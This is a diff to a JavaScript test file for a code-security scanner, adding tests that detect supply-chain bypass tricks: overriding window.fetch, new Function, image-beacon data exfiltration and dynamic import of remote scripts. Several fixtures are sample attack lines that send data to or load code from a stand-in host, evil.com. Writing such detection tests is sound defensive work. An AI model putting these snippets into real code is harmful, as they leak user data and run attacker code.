@@ -537,6 +537,7 @@ describe('adjustViolationSeverity - ファイルコンテキスト別の抑制',
       'no-prototype-pollution',
       'no-global-override',
       'no-network-without-permission',
+      'no-new-function',
     ])('%s は完全抑制される', (rule) => {
       const result = adjustViolationSeverity(rule, 'critical', bundledContext)
       expect(result).toBeNull()
@@ -725,6 +726,227 @@ describe('サプライチェーン攻撃対策 - ルール細分化', () => {
       }
       expect(adjustViolationSeverity('no-sensitive-api-override', 'critical', remoteEntryContext)).toBe('critical')
       expect(adjustViolationSeverity('no-unauthorized-domain', 'critical', remoteEntryContext)).toBe('critical')
+    })
+  })
+})
+
+describe('バイパスパターン検出の強化', () => {
+  describe('強化1: computed property によるセンシティブ API オーバーライド', () => {
+    it('window["fetch"] = ... は no-sensitive-api-override として検出される', () => {
+      const code = `
+        window["fetch"] = function(...args) { return null }
+      `
+      const signals = analyzeCodeSecurity(code)
+
+      expect(signals.hasGlobalVariableOverride).toBe(true)
+      expect(signals.detectedViolations).toEqual(
+        expect.arrayContaining([
+          expect.objectContaining({
+            rule: 'no-sensitive-api-override',
+            severity: 'critical',
+            message: expect.stringContaining('window.fetch'),
+          }),
+        ])
+      )
+    })
+
+    it('window["__THREE__"] = ... は no-global-override として検出される', () => {
+      const code = `
+        window["__THREE__"] = '0.157.0'
+      `
+      const signals = analyzeCodeSecurity(code)
+
+      expect(signals.hasGlobalVariableOverride).toBe(true)
+      expect(signals.detectedViolations).toEqual(
+        expect.arrayContaining([
+          expect.objectContaining({
+            rule: 'no-global-override',
+            severity: 'critical',
+          }),
+        ])
+      )
+      expect(signals.detectedViolations.filter(v => v.rule === 'no-sensitive-api-override')).toHaveLength(0)
+    })
+  })
+
+  describe('強化2: Object.defineProperty / Reflect.set によるセンシティブ API 改ざん', () => {
+    it('Object.defineProperty(window, "fetch", ...) は no-sensitive-api-override として検出される', () => {
+      const code = `
+        Object.defineProperty(window, 'fetch', { value: function() {} })
+      `
+      const signals = analyzeCodeSecurity(code)
+
+      expect(signals.hasGlobalVariableOverride).toBe(true)
+      expect(signals.detectedViolations).toEqual(
+        expect.arrayContaining([
+          expect.objectContaining({
+            rule: 'no-sensitive-api-override',
+            severity: 'critical',
+            message: expect.stringContaining('window.fetch'),
+          }),
+        ])
+      )
+    })
+
+    it('Object.defineProperty(window, "__THREE__", ...) は no-global-override として検出される', () => {
+      const code = `
+        Object.defineProperty(window, '__THREE__', { value: '0.157.0' })
+      `
+      const signals = analyzeCodeSecurity(code)
+
+      expect(signals.hasGlobalVariableOverride).toBe(true)
+      expect(signals.detectedViolations).toEqual(
+        expect.arrayContaining([
+          expect.objectContaining({
+            rule: 'no-global-override',
+            severity: 'critical',
+          }),
+        ])
+      )
+      expect(signals.detectedViolations.filter(v => v.rule === 'no-sensitive-api-override')).toHaveLength(0)
+    })
+
+    it('Reflect.set(window, "fetch", ...) は no-sensitive-api-override として検出される', () => {
+      const code = `
+        Reflect.set(window, 'fetch', function() {})
+      `
+      const signals = analyzeCodeSecurity(code)
+
+      expect(signals.hasGlobalVariableOverride).toBe(true)
+      expect(signals.detectedViolations).toEqual(
+        expect.arrayContaining([
+          expect.objectContaining({
+            rule: 'no-sensitive-api-override',
+            severity: 'critical',
+            message: expect.stringContaining('window.fetch'),
+          }),
+        ])
+      )
+    })
+  })
+
+  describe('強化3: new Function() コンストラクタ', () => {
+    it('new Function("...") でセンシティブ API を参照すると no-sensitive-api-override として検出される', () => {
+      const code = `
+        const fn = new Function('return fetch')
+      `
+      const signals = analyzeCodeSecurity(code)
+
+      expect(signals.hasEval).toBe(true)
+      expect(signals.hasDynamicCodeExecution).toBe(true)
+      expect(signals.detectedViolations).toEqual(
+        expect.arrayContaining([
+          expect.objectContaining({
+            rule: 'no-sensitive-api-override',
+            severity: 'critical',
+            message: expect.stringContaining('fetch'),
+          }),
+        ])
+      )
+    })
+
+    it('new Function("...") で非許可ドメイン URL を参照すると no-unauthorized-domain として検出される', () => {
+      const code = `
+        new Function('return fetch("https://evil.com/steal")')
+      `
+      const signals = analyzeCodeSecurity(code)
+
+      expect(signals.hasNetworkAPI).toBe(true)
+      expect(signals.hasNetworkWithoutPermission).toBe(true)
+      expect(signals.detectedViolations).toEqual(
+        expect.arrayContaining([
+          expect.objectContaining({
+            rule: 'no-unauthorized-domain',
+            severity: 'critical',
+            message: expect.stringContaining('evil.com'),
+          }),
+        ])
+      )
+    })
+
+    it('new Function("...") でセンシティブ API も URL も参照しない場合は no-new-function として検出される', () => {
+      const code = `
+        const fn = new Function('return 1 + 2')
+      `
+      const signals = analyzeCodeSecurity(code)
+
+      expect(signals.hasEval).toBe(true)
+      expect(signals.detectedViolations).toEqual(
+        expect.arrayContaining([
+          expect.objectContaining({
+            rule: 'no-new-function',
+            severity: 'critical',
+            message: expect.stringContaining('new Function()'),
+          }),
+        ])
+      )
+    })
+
+    it('bundled dependency で no-new-function は抑制されるが no-sensitive-api-override は抑制されない', () => {
+      const bundledContext: FileContext = {
+        filePath: 'compromised-lib-abc123.js',
+        isUserCode: false,
+        isSharedLibrary: false,
+        isBundledDependency: true,
+      }
+
+      // no-new-function は抑制される（rapier 等の正当な使用）
+      expect(adjustViolationSeverity('no-new-function', 'critical', bundledContext)).toBeNull()
+      // no-sensitive-api-override は抑制されない（攻撃検出）
+      expect(adjustViolationSeverity('no-sensitive-api-override', 'critical', bundledContext)).toBe('critical')
+      // no-unauthorized-domain も抑制されない（攻撃検出）
+      expect(adjustViolationSeverity('no-unauthorized-domain', 'critical', bundledContext)).toBe('critical')
+    })
+  })
+
+  describe('強化4: .src/.href によるデータ送信', () => {
+    it('new Image().src = "https://evil.com/..." は no-unauthorized-domain として検出される', () => {
+      const code = `
+        new Image().src = 'https://evil.com/steal?data=secret'
+      `
+      const signals = analyzeCodeSecurity(code)
+
+      expect(signals.hasNetworkAPI).toBe(true)
+      expect(signals.hasNetworkWithoutPermission).toBe(true)
+      expect(signals.detectedViolations).toEqual(
+        expect.arrayContaining([
+          expect.objectContaining({
+            rule: 'no-unauthorized-domain',
+            severity: 'critical',
+            message: expect.stringContaining('evil.com'),
+          }),
+        ])
+      )
+    })
+  })
+
+  describe('強化5: dynamic import', () => {
+    it('import("https://evil.com/malware.js") は no-unauthorized-domain として検出される', () => {
+      const code = `
+        import('https://evil.com/malware.js')
+      `
+      const signals = analyzeCodeSecurity(code)
+
+      expect(signals.hasNetworkAPI).toBe(true)
+      expect(signals.hasNetworkWithoutPermission).toBe(true)
+      expect(signals.detectedViolations).toEqual(
+        expect.arrayContaining([
+          expect.objectContaining({
+            rule: 'no-unauthorized-domain',
+            severity: 'critical',
+            message: expect.stringContaining('evil.com'),
+          }),
+        ])
+      )
+    })
+
+    it('import("./chunk.js") は違反なし（相対パス）', () => {
+      const code = `
+        import('./chunk.js')
+      `
+      const signals = analyzeCodeSecurity(code)
+
+      expect(signals.detectedViolations.filter(v => v.rule === 'no-unauthorized-domain')).toHaveLength(0)
     })
   })
 })
